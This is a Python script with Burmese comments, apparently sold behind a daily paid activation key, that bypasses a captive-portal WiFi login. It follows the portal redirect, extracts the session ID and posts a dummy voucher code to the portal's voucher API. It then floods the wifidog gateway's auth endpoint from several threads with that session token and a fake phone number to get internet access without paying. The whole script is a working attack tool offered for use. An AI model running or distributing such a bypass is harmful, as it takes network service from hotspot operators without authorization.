import requests
import re
import urllib3
import time
import threading
import hashlib
import os
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs, urljoin

# Warning ပိတ်ခြင်း
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
SECRET_SALT = "ohmygod@123" # Admin Tool နဲ့ အတူတူဖြစ်ရပါမယ်
PING_THREADS = 5
PING_INTERVAL = 0.1
LICENSE_HOURS = 24  # ၁ ခါ Activate လုပ်ရင် ၂၄ နာရီ သုံးလို့ရမယ်
TRACKER_FILE = os.path.join(os.path.expanduser("~"), ".sys_temp_log")
LICENSE_FILE = os.path.join(os.path.expanduser("~"), ".turbo_license")

def get_stable_id():
    """Device တစ်ခုစီအတွက် သီးသန့် ID ထုတ်ပေးခြင်း"""
    try:
        serial = os.popen("getprop ro.serialno").read().strip()
        if not serial:
            serial = os.popen("getprop ro.build.display.id").read().strip()
    except:
        serial = "DEFAULT_NODE"
    return f"TRB-{hashlib.md5(serial.encode()).hexdigest()[:10].upper()}"

def check_time_integrity():
    """Date နောက်ပြန်ဆုတ်ပြီး လိမ်ခြင်းကို တားဆီးရန်"""
    now = datetime.now().timestamp()
    if os.path.exists(TRACKER_FILE):
        with open(TRACKER_FILE, "r") as f:
            try: last_run = float(f.read().strip())
            except: last_run = 0
        if now < last_run:
            print("\n[!] Error: System Date manipulation detected!")
            print("[!] ကျေးဇူးပြု၍ ဖုန်း၏ Date ကို အမှန်ပြန်ပြင်ပါ။\n")
            return False
    with open(TRACKER_FILE, "w") as f:
        f.write(str(now))
    return True

def verify_activation():
    device_id = get_stable_id()
    
    if not check_time_integrity(): return False

    # ယနေ့အတွက် ထုတ်ပေးထားသော Key က ဘာဖြစ်ရမလဲဆိုတာ တွက်ထားခြင်း
    today_str = datetime.now().strftime("%Y-%m-%d")
    correct_key_today = hashlib.sha256(f"{device_id}{SECRET_SALT}{today_str}".encode()).hexdigest()[:12].upper()

    # သိမ်းထားတဲ့ License ရှိမရှိ စစ်ဆေးခြင်း
    if os.path.exists(LICENSE_FILE):
        with open(LICENSE_FILE, "r") as f:
            data = f.read().strip().split("|")
            if len(data) >= 2:
                saved_key, expiry_ts = data[0], data[1]
                expiry_time = datetime.fromtimestamp(float(expiry_ts))
                
                # အချိန်မကုန်သေးရင် ပေးသုံးမယ်
                if datetime.now() < expiry_time:
                    rem = expiry_time - datetime.now()
                    print(f"DEVICE ID: {device_id}")
                    print(f"STATUS: Verified ✔ (သက်တမ်းကျန်: {str(rem).split('.')[0]})")
                    return True
                else:
                    print("\n[!] Status: Expired! (အချိန်ပြည့်သွားပါပြီ)")
                    os.remove(LICENSE_FILE)

    # License မရှိရင် သို့မဟုတ် အချိန်ကုန်သွားရင် Key အသစ်တောင်းမယ်
    print(f"\nDEVICE ID: {device_id}")
    print(f"နေ့စွဲ: {today_str}")
    input_key = input("Enter Activation Key: ").strip().upper()
    
    # Key မှန်မမှန်စစ် (ဒီနေ့အတွက် ထုတ်ပေးတဲ့ Key ဖြစ်ရမယ်)
    if input_key == correct_key_today:
        expiry_ts = (datetime.now() + timedelta(hours=LICENSE_HOURS)).timestamp()
        with open(LICENSE_FILE, "w") as f:
            f.write(f"{input_key}|{expiry_ts}")
        print("\n[+] Activation Successful! Script ကို ပြန်ဖွင့်ပေးပါ။")
        return False
    else:
        print("\n[X] Invalid or Expired Key! Admin ထံမှ Key အသစ်ဝယ်ပါ။")
        return False

def check_real_internet():
    try: return requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=3).status_code == 204
    except: return False

def high_speed_ping(auth_link, session, sid):
    while True:
        try:
            session.get(auth_link, timeout=5)
            print(f"[{time.strftime('%H:%M:%S')}] SID: {sid} (Running...)    ", end='\r')
        except: break
        time.sleep(PING_INTERVAL)

def start_process():
    if not verify_activation(): return
    
    print(f"[{time.strftime('%H:%M:%S')}] Turbo Script Is Running...")
    while True:
        if not check_time_integrity(): break 
        
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            if r.url == test_url and check_real_internet():
                time.sleep(5)
                continue
            
            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
            
            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if sid:
                print(f"\n[*] New Session Detected: {sid}")
                voucher_api = f"{portal_host}/api/auth/voucher/"
                try: session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                except: pass

                params = parse_qs(parsed_portal.query)
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

                for _ in range(PING_THREADS):
                    threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True).start()

                while check_real_internet(): time.sleep(5)
        except: time.sleep(5)

if __name__ == "__main__":
    try: start_process()
    except KeyboardInterrupt: print("\nStopped.")
